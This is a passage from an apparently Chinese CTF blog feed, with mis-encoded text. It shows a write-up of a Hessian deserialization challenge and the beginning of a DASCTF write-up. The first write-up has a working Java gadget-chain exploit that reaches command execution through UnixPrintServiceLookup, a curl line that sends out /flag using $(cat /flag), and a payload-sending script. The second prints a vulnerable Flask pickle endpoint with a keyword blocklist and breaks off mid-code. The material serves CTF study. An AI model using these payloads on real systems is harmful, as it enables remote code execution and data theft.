ä¸ºXStringé€šè¿‡equalsæ¥è§¦å‘toStringï¼Œè€ŒHashMapååºåˆ—åŒ–çš„æ—¶å€™åˆšå¥½ä¼šè§¦å‘</p><p>ç„¶åTemplatesImpléƒ¨åˆ†çš„è§¦å‘å¯ä»¥æ¢æˆUnixPrintServiceLookupï¼Œä¸è¿‡è¿™ä¸ªç±»åªåœ¨Unixä¸‹é¢æ‰æœ‰ç”¨ï¼Œè€Œè¿™éƒ¨åˆ†çš„åˆ©ç”¨å°±åœ¨æˆ‘å‰é¢è¯´åˆ°çš„ç»•è¿‡sofa-hessiançš„issueé‡Œé¢</p><p><img src="https://cdn.clown2024.cn/image-20250112000746624.png" alt="image-20250112000746624"></p><p>è¿™å¾—ç”¨Linuxä¸‹çš„ideaè°ƒäº†ã€‚ã€‚ã€‚</p><h2 id="unixprintservicelookupç±»"><a href="#UnixPrintServiceLookupç±»" class="headerlink" title="UnixPrintServiceLookupç±»"></a>UnixPrintServiceLookupç±»</h2><p>è¿™é‡Œæ¥è°ƒä¸€ä¸‹ä»–çš„åˆ©ç”¨æ–¹å¼ï¼Œå› ä¸ºä¹‹å‰æ²¡è§è¿‡ï¼Œå¯ä»¥å‚è€ƒè¿™ç¯‡æ–‡ç« ï¼š<a href="https://whoopsunix.com/docs/components/Dubbo/CVE-2022-39198/">https://whoopsunix.com/docs/components/Dubbo/CVE-2022-39198/</a></p><blockquote><p><code>UnixPrintServiceLookup</code> æ˜¯ Java æ‰“å°æœåŠ¡ API ä¸­çš„ä¸€ä¸ªå¹³å°ç‰¹å®šå®ç°ç±»ï¼Œä¸»è¦ç”¨äºåœ¨ <strong>Unix&#x2F;Linux</strong> ç³»ç»Ÿä¸ŠæŸ¥æ‰¾å’Œç®¡ç†æ‰“å°æœåŠ¡ã€‚å®ƒæ˜¯ <code>PrintServiceLookup</code> çš„ä¸€ä¸ªå­ç±»ï¼Œä¸“é—¨ä¸º Unix ç±»æ“ä½œç³»ç»Ÿï¼ˆå¦‚ Linuxã€BSD ç­‰ï¼‰æä¾›æ‰“å°æœåŠ¡çš„æŸ¥æ‰¾å’Œè®¿é—®åŠŸèƒ½ã€‚</p></blockquote><p>è¯¥ç±»åˆ©ç”¨çš„getteræ–¹æ³•æ˜¯sun.print.UnixPrintServiceLookup#getDefaultPrintService()ï¼Œæœ€ç»ˆæ˜¯è§¦å‘åˆ°è¯¥ç±»é‡Œé¢çš„ä¸€ä¸ªexecCmdæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/image-20250112162426855.png" alt="image-20250112162426855"></p><p>è¯¥æ–¹æ³•çš„è°ƒç”¨æœ‰å¾ˆå¤šï¼Œæˆ‘ä»¬éœ€è¦æ‰¾ä¸€ä¸ªå‚æ•°æ˜¯æˆ‘ä»¬èƒ½å¤Ÿæ§åˆ¶çš„ï¼Œè¿™é‡Œæ‰¾åˆ°äº†getDefaultPrinterNameBSD()æ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/image-20250112170753639.png" alt="image-20250112170753639"></p><p><img src="https://cdn.clown2024.cn/image-20250112170831539.png" alt="image-20250112170831539"></p><p>è¿™é‡Œä¼ å…¥çš„å‚æ•°éƒ½æ˜¯å±æ€§å€¼ï¼Œé‚£æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡åå°„æ¥æ§åˆ¶äº†</p><p>ä¸è¿‡è¦èµ°åˆ°è¿™æˆ‘ä»¬éœ€è¦æ»¡è¶³å‰é¢ä¸¤ä¸ªæ¡ä»¶ï¼ŒisMac()å’ŒisSysV()åˆ¤æ–­çš„æ˜¯ä½ çš„ç³»ç»Ÿæ˜¯å¦ä¸ºmacOSå’ŒSunOSï¼Œå¯ä»¥ç”¨åå°„ç»•è¿‡ï¼Œæˆ‘ç”¨kaliçš„å°±ä¸ç”¨æ‹…å¿ƒï¼›</p><p>è¿˜æœ‰å°±æ˜¯isCupsRunning()æ–¹æ³•ï¼ŒisCupsRunningæ˜¯æ£€æµ‹æœ¬æœºçš„CUPSæœåŠ¡ï¼Œå¯ä»¥é€šè¿‡è®¿é—®<code>http://127.0.0.1:631/</code>çœ‹çœ‹æ˜¯å¦å¼€å¯ï¼Œæˆ‘ç”¨çš„kaliæ˜¯æ²¡æœ‰å¼€å¯ï¼Œçœ‹åˆ«äººè¯´Ubuntué»˜è®¤å¼€å¯ï¼Œè¦æ³¨æ„ä¸€ä¸‹ï¼Œå¦‚æœå¼€å¯äº†ç”¨ä¸‹é¢çš„å‘½ä»¤å…³é—­å³å¯</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">sudo systemctl mask cups<br>reboot<br></code></pre></td></tr></table></figure><p>ç„¶åè°ƒç”¨çš„å†™æ³•ç±»ä¼¼è¿™æ ·</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> sun.print.UnixPrintServiceLookup;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">demo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj,String name,Object value)</span><span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;touch /tmp/evilfile&quot;</span>;<br><span class="hljs-comment">//        Field theUnsafe = Unsafe.class.getDeclaredField(&quot;theUnsafe&quot;);</span><br><span class="hljs-comment">//        theUnsafe.setAccessible(true);</span><br><span class="hljs-comment">//        Unsafe unsafe = (Unsafe) theUnsafe.get(null);</span><br><span class="hljs-comment">//        Object unixPrintServiceLookup = unsafe.allocateInstance(UnixPrintServiceLookup.class);</span><br>        <span class="hljs-type">UnixPrintServiceLookup</span> <span class="hljs-variable">unixPrintServiceLookup</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnixPrintServiceLookup</span>();<br>        setFieldValue(unixPrintServiceLookup, <span class="hljs-string">&quot;cmdIndex&quot;</span>, <span class="hljs-number">0</span>);<br>        setFieldValue(unixPrintServiceLookup, <span class="hljs-string">&quot;osname&quot;</span>, <span class="hljs-string">&quot;xx&quot;</span>);<br>        setFieldValue(unixPrintServiceLookup, <span class="hljs-string">&quot;lpcFirstCom&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;cmd, cmd, cmd&#125;);<br>        System.out.println(unixPrintServiceLookup.getDefaultPrintService());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20250112171343508.png" alt="image-20250112171343508"></p><p>æˆåŠŸæ‰§è¡Œ</p><blockquote><p>ä¸è¿‡è¿™é‡Œæˆ‘çœ‹å¤§éƒ¨åˆ†éƒ½ç”¨Unsafeæ¥è·å–UnixPrintServiceLookupçš„å®ä¾‹ï¼Œå¯è¯¥ç±»çš„æ„é€ æ–¹æ³•æ˜¯publicçš„ï¼Œæˆ‘ä¸Šé¢æ­£å¸¸å†™ä¹Ÿæ˜¯èƒ½æ‰§è¡Œçš„ï¼Œæ€ªğŸ¤”</p></blockquote><h2 id="expæ„é€ "><a href="#expæ„é€ " class="headerlink" title="expæ„é€ "></a>expæ„é€ </h2><p>é‚£ç°åœ¨å°±å¯ä»¥æ¥æ”¹é€ æˆ‘ä»¬çš„expäº†(ç›´æ¥æŠ„æ–‡ç« çš„exp</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONObject;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.Hessian2Input;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.SerializerFactory;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;<br><span class="hljs-keyword">import</span> sun.misc.Unsafe;<br><span class="hljs-keyword">import</span> sun.print.UnixPrintServiceLookup;<br><br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Array;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BookExp</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj,String name,Object value)</span><span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//éœ€è¦æ‰§è¡Œçš„å‘½ä»¤</span><br>            <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;touch /tmp/evilTest&quot;</span>;<br>            <span class="hljs-type">Field</span> <span class="hljs-variable">theUnsafe</span> <span class="hljs-operator">=</span> Unsafe.class.getDeclaredField(<span class="hljs-string">&quot;theUnsafe&quot;</span>);<br>            theUnsafe.setAccessible(<span class="hljs-literal">true</span>);<br>            <span class="hljs-type">Unsafe</span> <span class="hljs-variable">unsafe</span> <span class="hljs-operator">=</span> (Unsafe) theUnsafe.get(<span class="hljs-literal">null</span>);<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">unixPrintServiceLookup</span> <span class="hljs-operator">=</span> unsafe.allocateInstance(UnixPrintServiceLookup.class);<br>            <span class="hljs-comment">//è®¾ç½®å±æ€§</span><br>            setValue(unixPrintServiceLookup, <span class="hljs-string">&quot;cmdIndex&quot;</span>, <span class="hljs-number">0</span>);<span class="hljs-comment">//ç»•è¿‡getDefaultPrinterNameBSDä¸­çš„é™åˆ¶</span><br>            setValue(unixPrintServiceLookup, <span class="hljs-string">&quot;osname&quot;</span>, <span class="hljs-string">&quot;xx&quot;</span>);<br>            setValue(unixPrintServiceLookup, <span class="hljs-string">&quot;lpcFirstCom&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;cmd, cmd, cmd&#125;);<br><br>            <span class="hljs-comment">//å°è£…ä¸€ä¸ªJSONObjectå¯¹è±¡è°ƒç”¨getteræ–¹æ³•</span><br>            <span class="hljs-type">JSONObject</span> <span class="hljs-variable">jsonObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONObject</span>();<br>            jsonObject.put(<span class="hljs-string">&quot;xx&quot;</span>, unixPrintServiceLookup);<br><br>            <span class="hljs-comment">//ä½¿ç”¨XStringç±»è°ƒç”¨toStringæ–¹æ³•</span><br>            <span class="hljs-type">XString</span> <span class="hljs-variable">xString</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">XString</span>(<span class="hljs-string">&quot;xx&quot;</span>);<br>            <span class="hljs-type">HashMap</span> <span class="hljs-variable">map1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>            <span class="hljs-type">HashMap</span> <span class="hljs-variable">map2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>            map1.put(<span class="hljs-string">&quot;yy&quot;</span>,jsonObject);<br>            map1.put(<span class="hljs-string">&quot;zZ&quot;</span>,xString);<br>            map2.put(<span class="hljs-string">&quot;yy&quot;</span>,xString);<br>            map2.put(<span class="hljs-string">&quot;zZ&quot;</span>,jsonObject);<br><br>            <span class="hljs-comment">//ä½¿ç”¨åå°„èµ‹å€¼ï¼Œé˜²æ­¢åºåˆ—åŒ–è¿‡ç¨‹è°ƒç”¨equalsæ–¹æ³•</span><br>            <span class="hljs-type">HashMap</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>            setValue(s, <span class="hljs-string">&quot;size&quot;</span>, <span class="hljs-number">2</span>);<br>            Class nodeC;<br>            <span class="hljs-keyword">try</span> &#123;<br>                nodeC = Class.forName(<span class="hljs-string">&quot;java.util.HashMap$Node&quot;</span>);<br>            &#125;<br>            <span class="hljs-keyword">catch</span> ( ClassNotFoundException e ) &#123;<br>                nodeC = Class.forName(<span class="hljs-string">&quot;java.util.HashMap$Entry&quot;</span>);<br>            &#125;<br>            <span class="hljs-type">Constructor</span> <span class="hljs-variable">nodeCons</span> <span class="hljs-operator">=</span> nodeC.getDeclaredConstructor(<span class="hljs-type">int</span>.class, Object.class, Object.class, nodeC);<br>            nodeCons.setAccessible(<span class="hljs-literal">true</span>);<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">tbl</span> <span class="hljs-operator">=</span> Array.newInstance(nodeC, <span class="hljs-number">2</span>);<br>            Array.set(tbl, <span class="hljs-number">0</span>, nodeCons.newInstance(<span class="hljs-number">0</span>, map1, map1, <span class="hljs-literal">null</span>));<br>            Array.set(tbl, <span class="hljs-number">1</span>, nodeCons.newInstance(<span class="hljs-number">0</span>, map2, map2, <span class="hljs-literal">null</span>));<br>            setValue(s, <span class="hljs-string">&quot;table&quot;</span>, tbl);<br><br>            FileOutputStream fileOutputStream=<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser&quot;</span>);<br>            <span class="hljs-type">Hessian2OutPutWithOverlongEncoding</span> <span class="hljs-variable">hessianOutput</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2OutPutWithOverlongEncoding</span>(fileOutputStream);<br>            hessianOutput.setSerializerFactory(<span class="hljs-keyword">new</span> <span class="hljs-title class_">SerializerFactory</span>());<br>            hessianOutput.getSerializerFactory().setAllowNonSerializable(<span class="hljs-literal">true</span>);<br>            hessianOutput.writeObject(s);<br>            hessianOutput.flushBuffer();<br><br>            <span class="hljs-comment">// test</span><br>            Hessian2Input hessian2Input=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Input</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;ser&quot;</span>));<br>            hessian2Input.readObject();<br><br>        &#125;<span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20250112171920831.png" alt="image-20250112171920831"></p><p>okæˆåŠŸæ‰§è¡Œ</p><h2 id="å¸¦å‡ºæ•°æ®"><a href="#å¸¦å‡ºæ•°æ®" class="headerlink" title="å¸¦å‡ºæ•°æ®"></a>å¸¦å‡ºæ•°æ®</h2><p>åŸé¢˜çš„é¶æœºæ˜¯ä¸å‡ºç½‘çš„ï¼Œä¸èƒ½ç›´æ¥å¼¹shellï¼Œæ‰€ä»¥éœ€è¦åˆ©ç”¨ä¸€äº›æ–¹å¼æ¥å¸¦å‡ºæ•°æ®ï¼Œé¢˜ç›®ç»™äº†æˆ‘ä»¬ç›¸å…³çš„ä¸€äº›æœåŠ¡ï¼Œ</p><p>é¢˜ç›®ä¸­çš„<code>/addBook</code> å¯ä»¥åŠ¨æ€æ·»åŠ å›¾ä¹¦å†…å®¹ï¼Œä¸”æ·»åŠ çš„å›¾ä¹¦å†…å®¹å¯ä»¥é€šè¿‡ <code>/getAllBooks</code> å›æ˜¾ï¼Œé‚£å°±å¯ä»¥åˆ©ç”¨è¯¥æ–¹å¼æ‹¿åˆ°æ¥å›æ˜¾flagã€‚</p><p>æˆ‘ä»¬è¦æ‰§è¡Œçš„å‘½ä»¤å°±æ˜¯åˆ©ç”¨curlå»è¯·æ±‚æœåŠ¡æ¥æ·»åŠ flag</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">curl -X POST http://localhost:8080/api/rest/book/addBook -H <span class="hljs-string">&quot;Content-Type: application/json&quot;</span> -d <span class="hljs-string">&#x27;&#123;&quot;bookId&quot;: 1, &quot;title&quot;: &quot;&#x27;</span>$(<span class="hljs-built_in">cat</span> /flag)<span class="hljs-string">&#x27;&quot;, &quot;author&quot;: &quot;yuanshan&quot;, &quot;publishDate&quot;: &quot;2024-12-22&quot;, &quot;price&quot;: 0.00&#125;&#x27;</span><br></code></pre></td></tr></table></figure><p>ç„¶åéœ€è¦å†™ä¸ªè„šæœ¬æ¥å‘åŒ…ï¼Œå› ä¸ºè¦ç›´æ¥å‘hessianæ•°æ®ï¼Œburpä¸å¥½æ“ä½œï¼Œä¹Ÿæ˜¯ç›´æ¥ç”¨æ–‡ç« é‡Œçš„è„šæœ¬å°±å¯ä»¥äº†</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;ser&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    body = f.read()<br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(body))<br><br>url = <span class="hljs-string">&quot;http://localhost:8080/api/rest/book/getBookById&quot;</span><br>headers = &#123; <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;application/hessian&quot;</span> &#125;<br>response = requests.get(url, headers=headers, data=body)<br><span class="hljs-built_in">print</span>(response.text)<br><br>url = <span class="hljs-string">&quot;http://localhost:8080/api/rest/book/getAllBooks&quot;</span><br>response = requests.get(url)<br><span class="hljs-built_in">print</span>(response.text)<br></code></pre></td></tr></table></figure><p>emmmè¿™é‡Œä¸€å¼€å§‹æˆ‘ç”¨çš„nssçš„ç¯å¢ƒï¼Œä½†æ˜¯æ‰“è¿‡å»æ²¡ååº”ï¼Œæœ¬åœ°æµ‹è¯•æ˜¯å¯ä»¥çš„ï¼Œé‚£å°±æœ¬åœ°æ‰“æ‰“ç®—äº†ï¼Œæ”¾ä¸ªflagåœ¨æ ¹ç›®å½•</p><p><img src="https://cdn.clown2024.cn/image-20250112180917440.png" alt="image-20250112180917440"></p><blockquote><p>è¿™é‡Œå¾—æ³¨æ„ä¸€ä¸‹å¾—è¯·æ±‚ä¸€ä¸ªæ¥å—å‚æ•°çš„è·¯ç”±æ‰ä¼šèµ°åˆ°hessianååºåˆ—åŒ–çš„åœ°æ–¹ï¼Œæ¯•ç«Ÿæ–¹æ³•åå«changeBodyäº†ï¼Œæ¥æ”¶Bodyæ‰èƒ½changeğŸ¤”</p></blockquote><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p><a href="https://xz.aliyun.com/t/16878?time__1311=Gui=GK0Iq+ED/D0l7GkDujUrF3PNfAeD">https://xz.aliyun.com/t/16878?time__1311=Gui%3DGK0Iq%2BED%2FD0l7GkDujUrF3PNfAeD</a></p><p><a href="https://github.com/opensolon/solon/issues/145">https://github.com/opensolon/solon/issues/145</a></p><p><a href="https://whoopsunix.com/docs/components/Dubbo/CVE-2022-39198/">https://whoopsunix.com/docs/components/Dubbo/CVE-2022-39198/</a></p><p><a href="https://www.cnblogs.com/kingbridge/articles/17020853.html">https://www.cnblogs.com/kingbridge/articles/17020853.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;å½“æ—¶ciscn&amp;amp;é•¿åŸæ¯åœºä¸Šçš„ä¸€é¢˜é›¶è§£é¢˜ï¼Œå½“æ—¶åç¼–è¯‘çœ‹äº†ä¸€ä¸‹è¿™é¢˜çš„æºç ï¼Œå‘ç°æ˜¯å¾®æœåŠ¡å½¢å¼çš„ï¼Œæœ‰ä¸ªApiGatewayï¼Œç„¶åçœ‹äº†åŠå¤©ä¹Ÿæ‰¾</summary>
      
    
    
    
    <category term="é¢˜ç›®å¤ç°" scheme="https://clowsman.github.io/categories/%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="wp" scheme="https://clowsman.github.io/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>DASCTF12æœˆæœ€åä¸€æˆ˜å¤ç°</title>
    <link href="https://clowsman.github.io/2024/12/25/DASCTF12%E6%9C%88%E6%9C%80%E5%90%8E%E4%B8%80%E6%88%98%E5%A4%8D%E7%8E%B0/"/>
    <id>https://clowsman.github.io/2024/12/25/DASCTF12%E6%9C%88%E6%9C%80%E5%90%8E%E4%B8%80%E6%88%98%E5%A4%8D%E7%8E%B0/</id>
    <published>2024-12-25T12:48:33.000Z</published>
    <updated>2025-02-09T13:15:26.275Z</updated>
    
    <content type="html"><![CDATA[<p>2024å¹´æœ€åä¸€æ¬¡çš„dasï¼Œwebç»ˆäºä¹Ÿæ˜¯æ²¡æœ‰çˆ†é›¶äº†ï¼Œæœ€åä¸€é¢˜çš„1è§£é¢˜çœ‹äº†gxnå¤§å“¥çš„wpä¹Ÿæ˜¯å­¦åˆ°æ–°ä¸œè¥¿äº†ï¼Œè¿™é‡Œè®°å½•ä¸€ä¸‹</p><p>å®˜æ–¹wpï¼š<a href="https://www.yuque.com/chuangfeimeiyigeren/eeii37/oxv3gaim7fr89ed2?singleDoc">https://www.yuque.com/chuangfeimeiyigeren/eeii37/oxv3gaim7fr89ed2?singleDoc</a></p><h1 id="const_python"><a href="#const-python" class="headerlink" title="const_python"></a>const_python</h1><p>é¢˜ç›®æºç ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> builtins<br><span class="hljs-keyword">import</span> io<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> uuid<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request,jsonify,session<br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> base64<br><br><br>app = Flask(__name__)<br><br>app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>] = <span class="hljs-built_in">str</span>(uuid.uuid4()).replace(<span class="hljs-string">&quot;-&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, username, password, auth=<span class="hljs-string">&#x27;ctfer&#x27;</span></span>):<br>        self.username = username<br>        self.password = password<br>        self.auth = auth<br><br>password = <span class="hljs-built_in">str</span>(uuid.uuid4()).replace(<span class="hljs-string">&quot;-&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br>Admin = User(<span class="hljs-string">&#x27;admin&#x27;</span>, password,<span class="hljs-string">&quot;admin&quot;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Welcome to my application&quot;</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/login&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">post_login</span>():<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br><br>        username = request.form[<span class="hljs-string">&#x27;username&#x27;</span>]<br>        password = request.form[<span class="hljs-string">&#x27;password&#x27;</span>]<br><br><br>        <span class="hljs-keyword">if</span> username == <span class="hljs-string">&#x27;admin&#x27;</span> :<br>            <span class="hljs-keyword">if</span> password == admin.password:<br>                session[<span class="hljs-string">&#x27;username&#x27;</span>] = <span class="hljs-string">&quot;admin&quot;</span><br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Welcome Admin&quot;</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Invalid Credentials&quot;</span><br>        <span class="hljs-keyword">else</span>:<br>            session[<span class="hljs-string">&#x27;username&#x27;</span>] = username<br><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">        &lt;form method=&quot;post&quot;&gt;</span><br><span class="hljs-string">        &lt;!-- /src may help you&gt;</span><br><span class="hljs-string">            Username: &lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;&lt;br&gt;</span><br><span class="hljs-string">            Password: &lt;input type=&quot;password&quot; name=&quot;password&quot;&gt;&lt;br&gt;</span><br><span class="hljs-string">            &lt;input type=&quot;submit&quot; value=&quot;Login&quot;&gt;</span><br><span class="hljs-string">        &lt;/form&gt;</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/ppicklee&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ppicklee</span>():<br>    data = request.form[<span class="hljs-string">&#x27;data&#x27;</span>]<br><br>    sys.modules[<span class="hljs-string">&#x27;os&#x27;</span>] = <span class="hljs-string">&quot;not allowed&quot;</span><br>    sys.modules[<span class="hljs-string">&#x27;sys&#x27;</span>] = <span class="hljs-string">&quot;not allowed&quot;</span><br>    <span class="hljs-keyword">try</span>:<br><br>        pickle_data = base64.b64decode(data)<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> &#123;<span class="hljs-string">&quot;os&quot;</span>, <span class="hljs-string">&quot;system&quot;</span>, <span class="hljs-string">&quot;eval&quot;</span>, <span class="hljs-string">&#x27;setstate&#x27;</span>, <span class="hljs-string">&quot;globals&quot;</span>, <span class="hljs-string">&#x27;exec&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>, <span class="hljs-string">&#x27;template&#x27;</span>, <span class="hljs-string">&#x27;render&#x27;</span>, <span class="hljs-string">&#x27;\\&#x27;</span>,<br>                 <span class="hljs-string">&#x27;compile&#x27;</span>, <span class="hljs-string">&#x27;requests&#x27;</span>, <span class="hljs-string">&#x27;exit&#x27;</span>,  <span class="hljs-string">&#x27;pickle&#x27;</span>,<span class="hljs-string">&quot;class&quot;</span>,<span class="hljs-string">&quot;mro&quot;</span>,<span class="hljs-string">&quot;flask&quot;</span>,<span class="hljs-string">&quot;sys&quot;</span>,<span class="hljs-string">&quot;base&quot;</span>,<span class="hljs-string">&quot;init&quot;</span>,<span class="hljs-string">&quot;config&quot;</span>,<span class="hljs-string">&quot;session&quot;</span>&#125;:<br>            <span class="hljs-keyword">if</span> i.encode() <span class="hljs-keyword">in</span> pickle_data:<br>                <span class="hljs-keyword">return</span> i+<span class="hljs-string">&quot; waf !!!!!!!&quot;</span><br><br>        pickle.loads(pickle_data)<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;success pickle&quot;</span><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>(e))<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;fail pickle&quot;</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/admin&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">admin</span>():<br>    username = session[<span class="hljs-string">&#x27;username&#x27;</span>]<br>    <span class="hljs-keyword">if</span> username != <span class="hljs-string">&quot;admin&quot;</span>:<br>        <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&#x27;You are not admin!&#x27;</span>&#125;)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Welcome Admin&quot;</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/src&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">src</span>():<br>    <span class="hljs-keyword">return</span>  <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;app.py&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>,encoding=<span class="hljs-string">&quot;utf-8&quot;</span>).read()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span 